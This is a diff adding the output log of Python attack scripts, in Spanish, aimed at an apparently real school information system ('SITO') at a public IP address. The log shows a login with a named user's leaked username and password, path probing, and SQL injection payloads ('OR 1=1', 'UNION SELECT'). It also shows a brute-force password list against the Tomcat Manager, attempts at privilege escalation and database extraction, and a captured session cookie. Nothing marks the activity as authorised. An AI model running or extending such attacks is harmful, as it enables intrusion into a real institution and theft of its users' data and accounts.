@@ -1,0 +1,108 @@
+Explotación del Login Exitoso:
+
+=== EXPLOTACIÓN SITO CON CREDENCIALES ===
+Credenciales: hnieto:utslp
+[+] Iniciando sesión en SITO...
+✅ Login exitoso a SITO
+
+[+] Explorando área autenticada...
+❌ Error 404: /jsp/admin/
+❌ Error 404: /jsp/admin/index.jsp
+❌ Error 404: /jsp/menu_principal.jsp
+❌ Error 404: /jsp/escolar/
+❌ Error 404: /jsp/configuracion/
+❌ Error 404: /jsp/reportes/
+❌ Error 404: /jsp/database/
+❌ Error 404: /jsp/usuarios/
+
+[+] Probando SQL Injection autenticado...
+
+🔍 Probando: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp
+   Payload: 1... -> Status: 200
+   Payload: 1' OR '1'='1'-- ... -> Status: 404
+   Payload: 1' UNION SELECT user(),databas... -> Status: 404
+   Payload: 1' UNION SELECT table_name,col... -> Status: 404
+
+🔍 Probando: /jsp/escolar/muestra_bachillerato_ajax.jsp
+   Payload: 1... -> Status: 200
+   Payload: 1' OR '1'='1'-- ... -> Status: 500
+   Payload: 1' UNION SELECT user(),databas... -> Status: 500
+   Payload: 1' UNION SELECT table_name,col... -> Status: 500
+
+🔍 Probando: /jsp/admin/buscar_usuario.jsp
+   Payload: 1... -> Status: 404
+   Payload: 1' OR '1'='1'-- ... -> Status: 404
+   Payload: 1' UNION SELECT user(),databas... -> Status: 404
+   Payload: 1' UNION SELECT table_name,col... -> Status: 404
+
+🔍 Probando: /jsp/reportes/generar_reporte.jsp
+   Payload: 1... -> Status: 404
+   Payload: 1' OR '1'='1'-- ... -> Status: 404
+   Payload: 1' UNION SELECT user(),databas... -> Status: 404
+   Payload: 1' UNION SELECT table_name,col... -> Status: 404
+
+[+] Intentando escalación de privilegios...
+❌ Error 404: /jsp/admin/crear_usuario.jsp
+❌ Error 404: /jsp/admin/cambiar_permisos.jsp
+❌ Error 404: /jsp/admin/backup_database.jsp
+❌ Error 404: /jsp/configuracion/modificar_config.jsp
+
+✅ Explotación completada. Paths accesibles: 0
+
+Fuerza Bruta del Tomcat Manager con Credenciales Conocidas:
+
+[+] Fuerza bruta del Tomcat Manager...
+❌ Falló: hnieto:utslp
+❌ Falló: hnieto:admin
+❌ Falló: hnieto:tomcat
+❌ Falló: hnieto:manager
+❌ Falló: hnieto:password
+❌ Falló: admin:utslp
+❌ Falló: tomcat:utslp
+❌ Falló: manager:utslp
+❌ Falló: root:utslp
+❌ Falló: admin:admin
+❌ Falló: tomcat:tomcat
+❌ Falló: manager:manager
+❌ Falló: both:tomcat
+❌ Falló: role1:role1
+❌ Falló: hnieto:utslp.edu.mx
+❌ Falló: admin:utslp.edu.mx
+❌ Falló: sito:sito
+❌ Falló: hnieto:hnieto123
+❌ Falló: hnieto:Hnieto123
+❌ Falló: hnieto:Hnieto@123
+❌ No se encontraron credenciales para el Manager
+
+Extracción de Base de Datos via Aplicación SITO:
+
+
+🔍 Probando endpoint: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+🔍 Probando endpoint: /jsp/admin/estadisticas.jsp
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+🔍 Probando endpoint: /jsp/configuracion/database_config.jsp
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+🔍 Probando endpoint: /jsp/reportes/connection_test.jsp
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+
+Análisis de la Sesión Autenticada:
+
+[+] Analizando sesión autenticada...
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+✅ Sesión obtenida
+
+🍪 COOKIES DE SESIÓN:
+   JSESSIONID = 8A17B8DC5A26EDB0C747B477D48CCC1D
+      🔑 JSESSIONID: 8A17B8DC5A26EDB0C747B477D48CCC1D
+
+📋 HEADERS DE RESPUESTA:
+   Server: Apache-Coyote/1.1
+
